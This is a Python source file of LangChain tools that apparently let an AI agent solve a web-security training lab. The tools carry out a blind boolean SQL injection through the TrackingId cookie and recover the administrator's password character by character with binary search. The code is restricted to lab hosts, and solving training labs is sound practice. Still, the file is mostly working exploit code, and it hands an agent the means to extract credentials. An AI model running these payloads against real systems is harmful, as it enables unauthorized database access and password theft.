"""Fast extraction tools that execute binary search deterministically."""

import asyncio
from typing import Any
from langchain_core.tools import tool

from src.config import REQUEST_DELAY
from src.memory.progress import increment_query_count
from src.tools.browser_tools import get_browser_lock


async def _send_payload_fast(page, context, base_url: str, payload: str) -> bool:
    """Internal function to send payload quickly."""
    domain = base_url.split("/")[2]
    
    # Get existing TrackingId
    cookies = await context.cookies()
    tracking_id = "xyz"
    for cookie in cookies:
        if cookie["name"] == "TrackingId":
            tracking_id = cookie["value"]
            break
    
    # Set modified cookie
    await context.add_cookies([{
        "name": "TrackingId",
        "value": tracking_id + payload,
        "domain": domain,
        "path": "/",
    }])
    
    # Navigate and check response
    await page.goto(base_url, wait_until="domcontentloaded")
    await asyncio.sleep(REQUEST_DELAY)
    
    content = await page.content()
    condition_true = "Welcome back" in content
    
    # Reset cookie
    await context.add_cookies([{
        "name": "TrackingId",
        "value": tracking_id,
        "domain": domain,
        "path": "/",
    }])
    
    return condition_true


@tool
async def extract_character_fast(position: int) -> dict[str, Any]:
    """Extract a single character using fast binary search (no LLM calls per query).
    
    This tool performs binary search deterministically - you only need to call it once
    per character position, and it handles all the queries internally.
    
    Args:
        position: The character position to extract (1-indexed)
        
    Returns:
        Dictionary with the extracted character and query count.
    """
    from src.tools.browser_tools import _page, _context
    
    if _page is None or _context is None:
        return {
            "success": False,
            "error": "Browser not initialized. Call initialize_lab first.",
        }
    
    current_url = _page.url
    if "web-security-academy.net" not in current_url:
        return {
            "success": False,
            "error": "Not on a lab instance. Call initialize_lab first.",
        }
    
    async with get_browser_lock():
        try:
            base_url = "/".join(current_url.split("/")[:3])
            
            # Binary search on ASCII value
            # Alphanumeric range: 48-57 (digits), 97-122 (lowercase)
            # But we'll search wider to be safe: 32-126
            low, high = 32, 126
            query_count = 0
            
            while low < high:
                mid = (low + high) // 2
                payload = f"' AND (SELECT ASCII(SUBSTRING(password,{position},1)) FROM users WHERE username='administrator')>{mid}--"
                
                result = await _send_payload_fast(_page, _context, base_url, payload)
                query_count += 1
                increment_query_count()
                
                if result:
                    low = mid + 1
                else:
                    high = mid
            
            char = chr(low)
            
            # Update progress with the extracted character
            from src.memory.progress import read_progress, update_progress
            progress = read_progress()
            current_password = progress.get("extracted_password", "")
            
            # Only append if this is the next position
            if position == len(current_password) + 1:
                update_progress("extracted_password", current_password + char)
                update_progress("current_position", position + 1)
            
            return {
                "success": True,
                "character": char,
                "position": position,
                "ascii_value": ord(char),
                "queries_used": query_count,
                "message": f"Extracted character '{char}' at position {position} using {query_count} queries"
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": f"Failed to extract character: {e}"
            }


@tool
async def extract_password_fast(start_position: int = 1, password_length: int = 20) -> dict[str, Any]:
    """Extract multiple characters efficiently using fast binary search.
    
    This tool extracts characters from start_position to password_length
    using deterministic binary search (no LLM overhead).
    
    Args:
        start_position: Starting character position (1-indexed)
        password_length: Total password length
        
    Returns:
        Dictionary with extracted password and statistics.
    """
    from src.tools.browser_tools import _page, _context
    
    if _page is None or _context is None:
        return {
            "success": False,
            "error": "Browser not initialized. Call initialize_lab first.",
        }
    
    current_url = _page.url
    if "web-security-academy.net" not in current_url:
        return {
            "success": False,
            "error": "Not on a lab instance. Call initialize_lab first.",
        }
    
    async with get_browser_lock():
        try:
            base_url = "/".join(current_url.split("/")[:3])
            password = ""
            total_queries = 0
            
            for pos in range(start_position, password_length + 1):
                # Binary search for this character
                low, high = 32, 126
                
                while low < high:
                    mid = (low + high) // 2
                    payload = f"' AND (SELECT ASCII(SUBSTRING(password,{pos},1)) FROM users WHERE username='administrator')>{mid}--"
                    
                    result = await _send_payload_fast(_page, _context, base_url, payload)
                    total_queries += 1
                    increment_query_count()
                    
                    if result:
                        low = mid + 1
                    else:
                        high = mid
                
                char = chr(low)
                password += char
                print(f"  Position {pos}: '{char}' -> '{password}'")
            
            # Update progress with the full extracted password
            from src.memory.progress import read_progress, update_progress
            progress = read_progress()
            existing_password = progress.get("extracted_password", "")
            full_password = existing_password + password
            
            update_progress("extracted_password", full_password)
            update_progress("password_length", password_length)
            update_progress("current_position", password_length + 1)
            
            return {
                "success": True,
                "password": password,
                "start_position": start_position,
                "end_position": password_length,
                "characters_extracted": len(password),
                "total_queries": total_queries,
                "message": f"Extracted {len(password)} characters using {total_queries} queries"
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "message": f"Failed to extract password: {e}"
            }


def get_extraction_tools() -> list:
    """Get all fast extraction tools."""
    return [extract_character_fast, extract_password_fast]

